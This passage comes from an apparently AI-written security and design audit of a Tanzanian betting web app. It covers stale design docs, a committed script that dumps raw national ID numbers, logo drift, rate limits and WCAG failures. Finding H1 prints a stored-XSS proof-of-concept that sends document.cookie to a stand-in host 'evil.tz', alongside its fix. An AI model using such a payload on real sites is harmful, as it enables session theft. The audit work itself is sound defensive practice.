## [ ] C9 — **NEW v5** · Design docs actively instruct engineers to break the brand

| | |
|---|---|
| **Severity** | **Critical** *(promoted from H13 — this is not stale docs, it is a live instruction)* |
| **Risk** | Brand reversion; resurrection of a deliberately-killed light theme; WCAG regression |
| **Affected** | `CLAUDE.md:39`, `CLAUDE.md:278`, `docs/kit-gap-audit.md`, `50PICK/design_handoff_.../kit/` |
| **Root cause** | Design authority moved from code to prose; the prose was never updated when the kit was superseded |

### What is wrong

`CLAUDE.md` does not merely *mention* the old kit. It **mandates** it — twice:

**Line 39** — the source-of-truth table:
> | Design kit (palette, banners, screens, tokens) | `50Pick/design_handoff_prediction_market_kit/kit/` — **read before any color / composition / hero change** |

**Line 278** — operator preferences:
> *"For any color, gradient, hero composition, or banner change: **read `50Pick/design_handoff_prediction_market_kit/kit/` first.** This was a hard-learned lesson — the `--hero-grad-warm` token was named "warm" but the kit's actual hero is a deep royal radial; **trust the kit, not the name**."*

**That kit is superseded.** Verified:

| | `kit/tokens.css` (mandated) | `src/app/globals.css` (live) | `design-master-brief.md` |
|---|---|---|---|
| Brand hue | **teal 215** | **royal 268** | `#060A50` → **268** ✓ |
| Light theme | **full `[data-theme="light"]` palette** | **none — killed** | dark-first ✓ |
| YES | `oklch(70% 0.18 150)` | `oklch(62% 0.17 152)` | `#00A24F` → `62.3 0.167 151.2` ✓ |

**The live build matches the brief. The mandated kit matches neither.**

### The inversion

The `--hero-grad-warm` warning was **correct when written**. It is now backwards:

```
When written (~June):  kit = correct,  live = wrong  →  "trust the kit"  RIGHT
Today (July):          kit = teal 215 + light theme
                       live = royal 268, dark-only, matches the brief
                       →  "trust the kit"  PRODUCES THE BUG IT WARNS ABOUT
```

Verified: `--hero-grad-warm` at `globals.css:329` **is already** a royal radial (`oklch(24% 0.150 268)`). **The bug is fixed.** The lesson survives as a live instruction pointing at the artifact that would re-introduce it.

### Steps to reproduce

An engineer is asked to adjust a hero gradient. Following the documented process:

1. Reads `CLAUDE.md:278` → *"read the kit first… trust the kit, not the name."*
2. Opens `50PICK/design_handoff_.../kit/tokens.css`
3. Reads `--teal-500: oklch(45% 0.10 215)` — **teal**
4. "Corrects" the live royal 268 back to teal 215 — **brand reverted**
5. Sees `[data-theme="light"]` and re-adds the light theme — **invariant B3 broken**
6. **Believes they followed the documented process. They did.**

### Three docs, three different sources of truth

| Date | Doc | Claims authority | Matches build? |
|---|---|---|---|
| 2026-07-04 | `docs/kit-gap-audit.md` | *"build only from the kit; never invent"* → the **teal** kit | ❌ **No** |
| 2026-07-07 | `refinement-spec.md` | *"Grounded in: design-master-brief.md (source of truth)"* | ✅ Yes |
| undated | `docs/design-master-brief.md` | *"the complete, grounded source of truth… supersedes ad-hoc notes"* | ✅ **Yes** |
| — | `CLAUDE.md:39, :278` | the **teal** kit | ❌ **No** |

Two of the four point at an artifact that would break the brand. `kit-gap-audit.md`'s rule — *"build only from the kit; never invent; when the kit is silent, stop"* — is a **hard rule** that, followed today, mandates a regression.

### Why Critical, not High

This is the **same failure class as C7**. In C7, a compliance control's enforcement was moved from a code gate to prose ("re-check it is OFF before go-live") — and prose doesn't enforce. Here, design authority was moved from the kit to the brief **in practice**, but the prose still names the kit — **and prose doesn't self-update.**

It also has a **proven** victim: **v2 of this audit** benchmarked your design system against the teal kit *because `CLAUDE.md` told it to*. The instruction has already misled one reader who was actively trying to be careful. It will mislead engineers who are merely busy.

And it carries a **safety** consequence: re-adding the light theme resurrects an entire untested contrast surface. Every WCAG ratio in §9 is computed for **one** theme. A resurrected light mode has **zero** verified contrast — on a money product.

### Recommended fix

**1. Correct `CLAUDE.md` today** (15 minutes, highest ratio of risk-removed to effort in this report):
```diff
- | Design kit (palette, banners, screens, tokens) | `50Pick/design_handoff_prediction_market_kit/kit/`
-   — **read before any color / composition / hero change** |
+ | Design authority (palette, tokens, invariants) | `docs/DESIGN_AUTHORITY.md` — **read before any
+   design change.** Implementation: `src/app/globals.css` (authoritative).
+   Palette rationale: `docs/design-master-brief.md`.
+   ⚠️ `50PICK/design_handoff_.../kit/` is a SUPERSEDED SNAPSHOT (teal 215, dead light
+   theme). Historical only — do NOT build from it. |

- - For any color, gradient, hero composition, or banner change: **read
-   `50Pick/design_handoff_prediction_market_kit/kit/` first.** This was a
-   hard-learned lesson — the `--hero-grad-warm` token was named "warm" but
-   the kit's actual hero is a deep royal radial; trust the kit, not the name.
+ - For any color, gradient, hero composition, or banner change: **read
+   `docs/DESIGN_AUTHORITY.md` first, then `src/app/globals.css`.**
+   Historical note: `--hero-grad-warm` was once misnamed; it is now correctly a
+   royal radial (globals.css:329). Lesson retained: trust the tokens, not the name.
```

**2. Retire `kit-gap-audit.md`'s rule.** Its *"build only from the kit"* sprint rule is dead. Mark the file `STATUS: historical — 2026-07-04. Superseded by design-master-brief.md.`

**3. Write `docs/DESIGN_AUTHORITY.md`** — it is cited **three times** in code (`theme-provider.tsx:6`, `globals.css:349`, `New Designs/globals.css:344`) as the authority for invariant **B3** (single theme) and **does not exist**. Your product's biggest design decision is justified by a phantom document. Record:
- **B1** — palette: royal 268, per `design-master-brief.md`. `src/app/globals.css` is authoritative.
- **B2** — YES/NO semantics are untouchable.
- **B3** — single dark-royal theme. No light mode. `color-scheme: dark` forced. *(cited by code today)*
- **B4** — claret editorial-only; aqua ≤8% coverage. *(already enforced in token comments)*

**4. Header every superseded artifact** (§15.3):
```
> ⚠️ SUPERSEDED SNAPSHOT — do not build from this file.
> Brand is royal 268, not teal 215. The [data-theme="light"] block is DEAD.
> Authority: docs/DESIGN_AUTHORITY.md · Implementation: src/app/globals.css
```

### Long-term architectural recommendation

**Design authority belongs in one place, and code should cite it by number, not by path.** Your token comments already do this well (*"Claret — editorial weight only… Never on YES/NO money surfaces"*). Extend it: `/* B1: royal 268 — see DESIGN_AUTHORITY */`. Then a stale doc cannot mandate a regression, because the rule lives beside the value it governs.

Add the CI check from **H13**: fail the build if `CLAUDE.md` names a path under `50PICK/` or `Final UI enhancement Kit/` as authoritative.

### Estimated impact if unresolved

The next engineer to touch a colour follows the documented process and reverts the brand. That's a visible, embarrassing regression on a product whose palette discipline is currently one of its **best** attributes (matched to the brief within 0.3%). Worse, re-adding the light theme creates an unverified contrast surface on money screens — turning a documentation problem into a **WCAG and trust** problem.

You told me design inconsistency annoys Tanzanian users more than losing money. **This is the mechanism by which that inconsistency gets introduced — by a careful engineer following your own written instructions.**

### Done when
- [ ] `CLAUDE.md:39` design-kit row replaced with `DESIGN_AUTHORITY.md`
- [ ] `CLAUDE.md:278` hero instruction rewritten; historical note retained
- [ ] `docs/DESIGN_AUTHORITY.md` written; B1–B4 recorded
- [ ] `kit-gap-audit.md` marked `STATUS: historical`; its "build only from the kit" rule retired
- [ ] Every superseded artifact carries a SUPERSEDED header
- [ ] CI check: no doc names `50PICK/` or `Final UI enhancement Kit/` as authoritative
- [ ] Grep clean: no doc instructs building from the teal kit

---

## [ ] C10 — **NEW v7** · `db-check.cjs` dumps raw NIDA + PII, committed to the repo

| | |
|---|---|
| **Severity** | **Critical** |
| **Risk** | PII/NIDA exposure · Data Protection Act · bypasses every masking control you built |
| **Affected** | `db-check.cjs` (repo root, 19 lines) |
| **Root cause** | Debug scratch file committed and never removed; not gitignored |

### What is wrong

```js
// db-check.cjs — repo root. Committed. Zero references anywhere.
const { PrismaClient } = require("@prisma/client");
const p = new PrismaClient();
async function main() {
  const users = await p.user.findMany({
    select: { id: true, email: true, phoneE164: true, status: true },
    orderBy: { createdAt: "desc" }, take: 10,
  });
  console.log(JSON.stringify(users, null, 2));          // ← raw email + phone
  const kyc = await p.kycSubmission.findMany({
    select: { id: true, userId: true, status: true, nidaNumber: true, fullName: true },
    orderBy: { createdAt: "desc" }, take: 10,
  });
  console.log("--- KYC ---");
  console.log(JSON.stringify(kyc, null, 2));            // ← RAW NIDA + full legal name
  await p.$disconnect();
}
main().catch((e) => { console.error(e); process.exit(1); });
```

**`node db-check.cjs`** against `DATABASE_URL` prints the last 10 players' **raw national ID numbers, full legal names, emails and phone numbers** to the terminal — and into shell history, CI logs, or a screen-share.

### Why this is Critical

**It defeats controls you deliberately built.** Everywhere else, you are careful:

| Your control | This file |
|---|---|
| `reports/catalogue.ts:210` — `${nida.slice(0,4)}…${nida.slice(-4)}` | **raw `nidaNumber`** |
| `reports/catalogue.ts:214` — `${phone.slice(0,4)}*****${phone.slice(-2)}` | **raw `phoneE164`** |
| `reports/catalogue.ts:366` — `hashNida()` salted SHA-256 | **raw** |
| `api/admin/kyc-doc` — role + TOTP + audited per view + `no-store` | **no auth, no audit, no log** |

Every KYC access in the product is gated and audited. **This bypasses all of it with `node db-check.cjs`.** There is no audit entry. Nothing records that PII was read.

### Steps to reproduce

1. Clone the repo (any developer, contractor, or anyone with read access).
2. Set `DATABASE_URL` to production.
3. `node db-check.cjs`
4. Raw NIDA numbers and full legal names print to stdout.

### Verified

```
references in src/, scripts/, docs/, package.json : 0
gitignored                                        : NO — committed
authentication                                    : none
audit entry                                       : none
```

**Found only by classifying every root-level file.** Nothing imports it, so an import-graph scan misses it; it isn't in `src/`, so a source audit misses it. It has been invisible to six versions of this report.

### Recommended fix

```bash
git rm db-check.cjs
```

Then add to `.gitignore`:
```gitignore
# Ad-hoc DB scratch scripts — never commit. Use scripts/ with masking.
db-check.*
*-check.cjs
scratch-*.js
```

**If you need this capability**, put it in `scripts/` with the same masking your reports use:
```js
nida: k.nidaNumber ? `${k.nidaNumber.slice(0,4)}…${k.nidaNumber.slice(-4)}` : "—",
phone: `${u.phoneE164.slice(0,4)}*****${u.phoneE164.slice(-2)}`,
fullName: k.fullName ? `${k.fullName.split(" ")[0]} ${"*".repeat(6)}` : "—",
```

**Also required:** rotate/scrub any place its output may have landed — CI logs, shell history, screenshots, chat pastes. And `git rm` does **not** remove it from history: if this ran against production and the output was ever committed or logged, treat it as a disclosure event.

### Long-term architectural recommendation

**A CI check that fails on raw-PII selects outside the masking layer.** Grep for `nidaNumber: true` / `phoneE164: true` / `fullName: true` in any file outside `src/lib/server/` and `reports/`, and fail the build. Same class as the C8 copy/code check and the C9 doc/code check: **bind the rule to the code, not to a convention someone has to remember.**

### Estimated impact if unresolved

A contractor clones the repo and runs it out of curiosity. NIDA numbers land in a terminal, a screenshot, a CI log. Under the Data Protection Act, that is a reportable disclosure — and you cannot prove it *didn't* happen, because **the script produces no audit entry**. Every other KYC read in your system is audited. This one is silent.

### Done when
- [ ] `git rm db-check.cjs`
- [ ] `.gitignore` blocks ad-hoc DB scratch scripts
- [ ] Git history checked for committed output
- [ ] CI/shell logs scrubbed; if it ran against prod, treat as a disclosure event
- [ ] Replacement (if needed) lives in `scripts/` with masking
- [ ] CI check: no raw-PII selects outside the masking layer

---

## [ ] C11 — **NEW v8** · Brand identity split: your PWA icon and emails ship the OLD logo

| | |
|---|---|
| **Severity** | **Critical** *(identity — the first thing every user sees)* |
| **Risk** | Two different logos in production · install-time trust break · unusable brand assets |
| **Affected** | `public/brand/*.svg` (all 4) → `public/icons/mark-color-512.png`, `mark-white-512.png`, `mark-dark-512.png`, `tile-512.png` · `manifest.json` · `send-sample-emails.mjs:6` |
| **Root cause** | Logo round 2 shipped to code; the exported assets were never regenerated |

### What is wrong

Your delivered final mark — `Final logo design/mark-a.svg` (2026-07-09):

```xml
<path d="M 38.87 5.37 A 46 46 0 0 0 61.13 94.63 Z" fill="#1EA362"/>   <!-- YES emerald LEFT  -->
<path d="M 38.87 5.37 A 46 46 0 0 1 61.13 94.63 Z" fill="#B03A3E"/>   <!-- NO rose RIGHT     -->
<line x1="38.39" y1="3.43" x2="61.61" y2="96.57" stroke="#E3BC66"/>   <!-- gilt NEEDLE       -->
<circle cx="50" cy="50" r="5"   fill="#E3BC66"/>                       <!-- gilt hub          -->
<circle cx="50" cy="50" r="1.7" fill="#1A2140"/>                       <!-- navy pivot        -->
```
**Five elements. No ring. No numerals.**

**`src/components/brand.tsx` implements it perfectly** — paths byte-identical, hexes identical, exactly five elements. ✅

**`public/brand/mark-color.svg` — which the manifest ships — is a different logo:**
```xml
<circle cx="50" cy="50" r="44.6" stroke="oklch(48% 0.20 268)" stroke-width="2.8"/>  <!-- RING -->
<circle cx="56.290" cy="75.228" r="2.5" fill="oklch(85% 0.13 86)"/>                  <!-- counterweight -->
<text x="50" y="51" font-size="29" ...>50</text>                                     <!-- NUMERALS -->
```

`brand.tsx`'s own header names it: *"50pick brand primitives — **FINAL (logo round 2**, Direction B "Needle")"* and describes round 1 as *"royal ring … "50" JetBrains Mono 700"*. **The assets are round 1.**

### Verified — the identity surface map

| Surface | Source | Version |
|---|---|---|
| In-app header, dial, all UI | `brand.tsx` `FiftyMark` | ✅ **NEW** |
| Browser tab | `favicon.svg` | ✅ **NEW** |
| **PWA home-screen icon** | `mark-color-512.png` ← `mark-color.svg` | ❌ **OLD** |
| **Maskable / Android adaptive** | `maskable-512.png` | ❌ **OLD** |
| **Every transactional email** | `send-sample-emails.mjs:6` → `mark-color-512.png` | ❌ **OLD** |
| `mark-white.svg`, `mark-dark.svg`, `mark-simplified.svg` | — | ❌ **OLD** |

**I confirmed this visually**, not by inference: rendering `mark-color-512.png` shows the royal ring, the "50" numerals, and the lower-right counterweight hub. `mark-a.svg` has none of them.

### Steps to reproduce

1. Install the PWA on Android → home-screen icon shows **ring + "50"**.
2. Open the app → header shows the **needle mark, no ring, no numerals**.
3. Trigger any transactional email → header image is the **old mark**.

**A player installs your app and sees one logo on their home screen and a different one inside.** At the exact moment they're deciding whether to trust you with money.

### Why Critical

You told me design inconsistency drives Tanzanian users away faster than losing money. **This is that, at the highest-visibility surface you have** — the icon on the home screen, and the logo at the top of every email about their money.

It is also the same shape as **C9**: the *code* moved to round 2, the *artifacts* stayed at round 1, and nothing bound them. Same as **C8** (copy vs code) and **C3** (ledger vs wallet). **The seam is always where it breaks.**

### Recommended fix

Regenerate all four brand SVGs from the delivered `mark-a.svg`, then rebuild the PNGs.

```bash
# 1. Colour variant — straight copy of the delivered final
cp "Final logo design/mark-a.svg" public/brand/mark-color.svg

# 2. Simplified — the delivered simplified variant
cp "Final logo design/mark-a-simplified.svg" public/brand/mark-simplified.svg
```

For `mark-white.svg` / `mark-dark.svg`, use the single-ink recipe **already encoded in `brand.tsx`** (`variant="white"|"dark"`), so exported assets and rendered UI share one definition:
```
white ink #F7F8FC : green α0.30 · red α0.14 · needle+hub solid ink
dark  ink #1A2140 : green α0.26 · red α0.11 · needle+hub solid ink
```

**Then rebuild every derived PNG:** `mark-color-512`, `mark-white-512`, `mark-dark-512`, `maskable-512`, `tile-512`, `icon-192`, `apple-touch-180`.

### Better alternative — bind the artifacts to the code

The drift happened because SVG assets and `brand.tsx` are two independent definitions of one mark. Make `brand.tsx` the **single source** and generate the assets from it:

```js
// scripts/build-brand-assets.mjs — render FiftyMark to SVG/PNG at every size.
// brand.tsx is the ONE definition. Assets are OUTPUT, never hand-authored.
```
`scripts/build-logo-png.mjs` already does something close — it just re-declares the mark inline instead of importing it. **Point it at `brand.tsx` and this class of drift becomes impossible.**

### Long-term architectural recommendation

Add the **identity check** to CI alongside the C8 (copy/code) and C9 (doc/code) checks:
```bash
# Fail if any brand asset contains round-1 artefacts
grep -rlE '<text|r="44\.6"' public/brand/ public/icons/ && exit 1
```
Three findings, one principle: **anything that states what the product is must be generated from the product, not maintained beside it.**

### Estimated impact if unresolved

Every PWA install and every email shows a logo your own code calls superseded. Investors see the old mark in the app-store listing and the new one in the demo. A Tanzanian player installing on a shared Android sees a ring-and-numerals icon, opens it, sees a needle mark, and — per your own reasoning about this market — quietly doubts the app.

### Done when
- [ ] All 4 `public/brand/*.svg` regenerated from `mark-a.svg` / `brand.tsx`
- [ ] All 7 derived PNGs rebuilt (`mark-color-512`, `mark-white-512`, `mark-dark-512`, `maskable-512`, `tile-512`, `icon-192`, `apple-touch-180`)
- [ ] `grep -rlE '<text|r="44\.6"' public/brand public/icons` → **0 hits**
- [ ] PWA install on Android/iOS: icon matches in-app mark
- [ ] Email header image matches in-app mark
- [ ] `og-1200x630.png` + `twitter-1200x600.png` visually checked for the old mark
- [ ] `scripts/build-logo-png.mjs` imports `brand.tsx` instead of re-declaring the mark
- [ ] CI check: no round-1 artefacts in brand assets

---

# 4. High

## [ ] H1 — Stored XSS: proposal title → unescaped JSON-LD
`markets/[id]/page.tsx:205`
```tsx
<script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }} />
```
`JSON.stringify` **does not escape `</script>`**. Verified:
```
Input:  Will X happen?</script><script>fetch("//evil.tz/"+document.cookie)</script>
Output: {"name":"Will X happen?</script><script>...</script>"}  → EXECUTES
```
**Player-controlled**: `submitProposal` (`:145`) validates **length only** (8–120 chars); `publishProposal` (`:528`) passes `p.titleEn` into `createMarket`; stored unmodified.

*Mitigating:* officer approval required; cookie is `HttpOnly`. But nobody spots `</script>` in a plausible 120-char title.

**Fix:** `JSON.stringify(jsonLd).replace(/</g, "\\u003c")` + Zod title schema rejecting `<`/`>` + CSP (H3).

- [ ] `<` escaped · [ ] title schema · [ ] CSP · [ ] PoC inert

## [ ] H2 — Rate limiter in-memory
File says *"Production: swap to Redis-backed bucket"*. Never happened.

| action | 1 | 2 | 4 | 8 instances |
|---|---|---|---|---|
| `auth.login` | 8 | 16 | 32 | 64 |
| `otp.verify` | 5 | 10 | 20 | 40 |
| `wallet.withdraw` | 3 | 6 | 12 | 24 |

RAM-resident → **every deploy resets counters**.

*Mitigating (real):* account lockout is **DB-backed** (`User.lockedUntil`), so password brute-force stays capped at 5. **This downgrades it from Critical.** Exposure is on limiters without a DB twin: OTP verify, withdrawal spam, SMS pumping (real cost per SMS).

- [ ] Redis/Postgres bucket · [ ] interface unchanged · [ ] 2-instance test: 8 not 16 · [ ] survives deploy

## [x] ~~H3 — No security headers~~ — **RETRACTED in v4. This finding was wrong.**

> **I reported this in v1, v2 and v3. It is false.** The headers exist and are well-implemented.

`src/proxy.ts` — which my own orphan-detector flagged as "never imported", and which is how I caught the error — contains:

```ts
export async function proxy(req: NextRequest) { ... }        // :148
export const config = { matcher: [ "/((?!_next/static|...).*)" ] };   // :195

const CSP = [
  "default-src 'self'", "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "font-src 'self' https://fonts.gstatic.com data:", "img-src 'self' data: blob:",
  "connect-src 'self' ws: wss:", "frame-ancestors 'none'",
  "base-uri 'self'", "form-action 'self'", "upgrade-insecure-requests",
].join("; ");

SECURITY_HEADERS = { "X-Frame-Options": "DENY", "X-Content-Type-Options": "nosniff",
  "Referrer-Policy": "strict-origin-when-cross-origin", "Permissions-Policy": [...] }
PROD_HEADERS   = { "Strict-Transport-Security": "max-age=63072000; includeSubDomains; preload" }
```

**Why I got it wrong:** Next.js 16 renamed the `middleware.ts` convention to `proxy.ts`. The file header says so plainly — *"Renamed from `middleware.ts` per Next 16 file-convention change."* I grepped `next.config.ts` for header keys and ran `ls src/middleware.ts middleware.ts`, got nothing, and concluded the headers were absent. **I checked for the old convention and never read the file that replaced it.**

`src/proxy.ts` is correctly named, correctly located (`src/` is valid when `src/app` is the app dir), correctly exported, and correctly scoped. HSTS is properly gated to production.

**Verified present:** CSP · HSTS · X-Frame-Options: DENY · X-Content-Type-Options · Referrer-Policy · Permissions-Policy. **All six of the headers I claimed were missing.**

### What remains — a genuine (Low) observation

`script-src 'unsafe-inline' 'unsafe-eval'` weakens CSP's XSS protection, so **H1 still needs its own fix** — the CSP is not a sufficient backstop for the JSON-LD injection on its own. The file already flags this: *"to nonce-based CSP when Next.js supports it for Turbopack builds."* That is the correct plan and a known Turbopack constraint, not negligence.

- [x] **Retracted — no action required.** Headers verified present and correctly scoped.
- [ ] *(Low, tracked under H1)* Move to nonce-based CSP when Turbopack supports it; drop `'unsafe-inline'`/`'unsafe-eval'`.

## [ ] H4 — `/api/health` full-scans `User` every probe
```ts
try { userCount = (await db.user.list()).length; } catch {}   // health/route.ts:22
list: async () => (await pc().user.findMany()).map(toStoredUser)   // no take/select/where
```
| Users | Heap per probe |
|---|---|
| 10,000 | ~4 MB |
| 100,000 | ~38 MB |
| 1,000,000 | **~381 MB** |

At 1M: ~380MB every 10s → GC thrash → **OOM. The healthcheck kills the service.** Restart wipes rate-limit buckets (H2) and audit ring (C6). **Cascade.**

**Fix:** `await pc().user.count();`

- [ ] health uses `count()` · [ ] diagnostic too · [ ] 100k load test: <50ms, flat memory

## [ ] H5 — NIDA duplicate check loads every KYC image in the DB
```ts
// kyc-service.ts:115 — on EVERY KYC submission
const nidaConflict = (await db.kyc.list()).find(k => k.userId !== userId && k.nidaNumber === nida && k.status !== "REJECTED");
// prisma-dal.ts:559 — hydrates FULL base64 images
findMany({ include: { documents: true } })
```
**`nidaNumber` IS indexed** (`schema.prisma:314`). The code bypasses it, pulling every row **plus every NIDA/selfie image** — ~1.2 TB at 100k players, **per submission**. A **P0 AML control** that times out under load.
```ts
const nidaConflict = await pc().kycSubmission.findFirst({
  where: { nidaNumber: nida, userId: { not: userId }, status: { not: "REJECTED" } },
  select: { userId: true, status: true },
});
```
- [ ] Indexed `findFirst` + `select` · [ ] `kyc.list()` excludes docs by default · [ ] `insights.ts:128`, `catalogue.ts:661`, `kyc-service.ts:312` audited · [ ] <200ms at 100k

## [ ] H6 — Zero error monitoring + 118 silent catches
```
$ grep -rn "Sentry\|datadog\|opentelemetry" package.json src   → nothing
silent catch blocks: 118   (market-service 27, bonus 13, wallet 8, kyc 8)
```
Every failure in C2/C3/C6 is swallowed into a void **nobody watches**. `console.error` on Railway is not monitoring.

**Sentry is 30 minutes and the single highest-leverage change in this report.**

- [ ] Sentry wired · [ ] money catches report · [ ] alerts: ledger drift, audit fork, `webhook.amount_mismatch`, `bonus.refund_forfeited`, settlement errors, RG blocks · [ ] alerts reach a human

## [ ] H7 — Webhook secret env vars mismatched
Code: `SELCOM_WEBHOOK_SECRET` / `AZAMPAY_WEBHOOK_SECRET` / `MIXX_WEBHOOK_SECRET`.
`.env.example:23`: `PAYMENT_WEBHOOK_SECRET`. `RAILWAY.md` lists none.

Ops sets the documented name → **every webhook 401s** → deposits never credit. Fail-closed (safe) but a **guaranteed launch-day outage**.

- [ ] `.env.example` + `RAILWAY.md` corrected · [ ] boot assertion per provider · [ ] staging round-trip verified

## [ ] H8 — KYC images base64 in Postgres
3MB raw → ~4.1MB base64 → **~12.3MB/player**.

| Players | In Postgres |
|---|---|
| 10,000 | 120 GB |
| 100,000 | 1.2 TB |
| 1,000,000 | **12 TB** |

Column is named `storageKey` with comment `// never store binaries in DB` (M8). PII in backups with no separate encryption boundary or lifecycle.

**Fix:** object storage + SSE + signed URLs. The route already anticipates it: *"When an object store is wired, swap the decode for a signed-URL redirect."* Pair with retention policy (Data Protection Act).

- [ ] Object storage + SSE · [ ] `storageKey` holds a real key · [ ] signed-URL redirect · [ ] images migrated · [ ] retention policy

## [ ] H9 — No CI, no DR runbook, no migration rollback
```
$ ls .github/workflows              → NONE
$ ls docs/ | grep -i backup|dr      → NONE
$ ls prisma/migrations/*/down.sql   → NONE
```
**57 test suites and nothing runs them.** `git push` → production, no gate.

CI **with a Postgres service container** is what makes C6/H2/M1/C4 visible.

- [ ] GitHub Actions + Postgres service · [ ] 57 suites green, merge blocked on fail · [ ] DR runbook **rehearsed**, RTO/RPO documented · [ ] backup restore tested · [ ] `down.sql` policy

## [ ] H10 — **NEW** · Five computed WCAG contrast failures

**Computed from the actual `globals.css` token values** (OKLCH → sRGB → WCAG 2.x relative luminance).

| Pair | fg | bg | Ratio | Req | Verdict |
|---|---|---|---|---|---|
| `btn-no`: white on `--no-500` | `#FFFFFF` | `#E6424C` | **4.02** | 4.5 | **FAIL** |
| `btn-danger`: white on `--danger-500` | `#FFFFFF` | `#E62B34` | **4.41** | 4.5 | **FAIL** |
| `--border` on `--bg` | `#1C2F7A` | `#040041` | **1.60** | 3.0 | **FAIL** |
| `--border` on `--bg-elevated` | `#1C2F7A` | `#07045A` | **1.48** | 3.0 | **FAIL** |
| `--border-strong` on `--bg` | `#3049A4` | `#040041` | **2.41** | 3.0 | **FAIL** |

**The `btn-no` failure is the serious one** — NO is half of the core money control.

Everything else **passes, often generously**: body text 18.31, muted 12.67, subtle 7.22, YES-500 5.78, gold-500 7.69, `btn-primary` 6.93, `btn-yes` 5.82, focus rings 8.86 / 4.75.

### Computed remediation

**`btn-no`** — two options:
```css
/* A: darken to keep the white label (recommended — preserves button convention) */
--no-500: oklch(58% 0.20 22);   /* #D73240 → white 4.74 ✓ */

/* B: keep #E6424C, use a dark label like btn-yes already does */
.btn-no { color: oklch(18% 0.05 22); }   /* → 4.73 ✓ */
```
Option A is safer: B makes YES and NO both dark-labelled, weakening the duality.

**`btn-danger`:**
```css
--danger-500: oklch(58% 0.22 25);   /* #DF202E → white 4.79 ✓ */
```

**`--border`:**
```css
--border: oklch(52% 0.130 268);   /* #4963B3 → bg 3.45, elevated 3.18 ✓ */
```
**Scope note:** WCAG 1.4.11 applies to borders that are the **only** means of identifying a control (input outlines, unfilled buttons). **Decorative card dividers are exempt.** Rather than lifting `--border` globally — which would visibly flatten the elevation hierarchy the kit works hard to build — introduce:
```css
--border-control: oklch(52% 0.130 268);   /* form controls — 1.4.11 compliant */
--border:         oklch(34% 0.130 268);   /* decorative dividers — unchanged */
```
This is the **design-preserving** fix and I'd recommend it over a blanket change.

- [ ] `btn-no` ≥4.5 · [ ] `btn-danger` ≥4.5 · [ ] `--border-control` ≥3.0 on both surfaces · [ ] re-run the contrast script · [ ] visual regression on YES/NO parity

## [ ] H11 — **NEW** · No skip link (WCAG 2.4.1 Level A)
`<main id="main-content">` **exists** (`app-shell.tsx:119`) — the target is there; the link was never added. A keyboard or screen-reader user must tab through the entire header and nav on **every** page.

**Level A** — the lowest bar, and the one most likely to be cited.
```tsx
// app-shell.tsx — first focusable element in <body>
<a href="#main-content"
   className="sr-only focus:not-sr-only focus:fixed focus:left-4 focus:top-4 focus:z-[100]
              focus:rounded-md focus:bg-bg-elevated focus:px-4 focus:py-2
              focus:text-text focus:outline focus:outline-2 focus:outline-teal-300">
  {t.common.skipToContent}
</a>
```
Add `skipToContent` to EN/SW/ZH.

- [ ] Skip link is first focusable · [ ] visible on focus · [ ] EN/SW/ZH strings · [ ] `scripts/a11y-audit.mjs` extended

## [ ] H12 — **NEW** · Withdraw confirm shows gross only — no tax, no net

`withdraw-confirm.tsx` — the last screen before money leaves:
```tsx
<span>{t.common.amountLabel}</span>  <span>{formSummary.amount}</span>   // GROSS
<span>{t.common.via}</span>          <span>{formSummary.provider}</span>
```
**No tax line. No net line.** The player confirms **"TZS 100,000"** and receives **85,000**.

`withdraw()` already computes `tax` and `net` and **returns them** — the modal just doesn't show them.

### Contrast with your own bet flow
`bet-confirm-modal.tsx` is **excellent**: locked 10s quote, stake, payout, `net = payout - stake`, and a colour-coded **lean warning** when the ratio is thin. That is a better disclosure than most regulated books.

**The betting flow discloses more than the withdrawal flow.** That's backwards: withdrawal is where a deduction actually occurs.

### Fix
```tsx
<div className="flex items-baseline justify-between">
  <span>{t.wallet.amountLabel}</span><span>{formatTzs(amount)}</span>
</div>
<div className="flex items-baseline justify-between text-warning-fg">
  <span>{t.wallet.taxWithheld}</span><span>−{formatTzs(tax)}</span>
</div>
<div className="flex items-baseline justify-between border-t border-border pt-1.5">
  <span className="font-bold">{t.wallet.youReceive}</span>
  <span className="font-bold text-gold-300">{formatTzs(net)}</span>
</div>
```
Compute client-side from the same `computeWithdrawalTax` (share it via `@/lib/payout`, as the dial already does for payouts).

**Ship with C1 + C8.** Together they turn the withdrawal flow honest.

- [ ] Tax + net shown before confirm · [ ] shares one tax fn with the server · [ ] EN/SW/ZH strings · [ ] matches `bet-confirm-modal` quality

## [x] ~~H13 — Documentation drift~~ — *promoted to **C9** in v5*

The `CLAUDE.md` falsehoods (light/dark, FR, `next-themes`) and the missing `DESIGN_AUTHORITY.md` are now **C9**, because `CLAUDE.md:39`/`:278` don't merely *describe* the stale kit — they **mandate** it. See **C9**.

Sub-items retained there: `CLAUDE.md` corrections · `DESIGN_AUTHORITY.md` creation · superseded-artifact headers · `docs/` reconciliation · CI doc-vs-code check.

# 5. Medium

## [ ] M1 — 32-bit advisory-lock hash collides across namespaces
Empirically over 100k realistic cuid keys: **1 collision**, cross-namespace:
```
COLLIDE: wallet:chmjin0ggv93fffnq <=> market:cg7t39uk4ng1gg3d1  (h=280122337)
```
**Correctness preserved** (over-serializes). Latency bug, not money. But `wallet:X` blocking `market:Y` under load is undiagnosable.
**Fix:** `pg_advisory_xact_lock(bigint)` with 64-bit hash (first 8 bytes of SHA-256); distinct classid per namespace.
- [ ] 64-bit hash · [ ] per-namespace classid · [ ] 1M-key collision test

## [ ] M2 — Pari-mutuel rounding drift unbudgeted
`Math.round` per winner, independently:
```
winners=  100  avg drift -0.77 TZS
winners= 1000  avg drift -2.46 TZS
winners=10000  avg drift +1.55 TZS
WORST single-market: -61.32 TZS
```
Small, bounded, roughly symmetric — genuinely low impact (`.int()` + no TZS subunit means my initial float concern was theoretical). But **positive drift = money created from nothing**, with no account absorbing it.
**Fix:** largest-remainder so `Σ payouts == floor(netPool)`; residue → `HOUSE:ROUNDING`.
- [ ] Largest-remainder · [ ] `HOUSE:ROUNDING` · [ ] conservation test

## [ ] M3 — Missing indexes
`User.role` (needed for H4/M5), `LedgerEntry.userId` (needed for C3's trial balance).
- [ ] Both added · [ ] `EXPLAIN ANALYZE` confirms index scans

## [ ] M4 — Webhook never verifies the amount
`settlePaymentWebhook({ providerRef, status })` ignores `parsed.amount`. Credits `txn.amount` (mitigates tampering) but **a provider under-paying is never detected**.
```ts
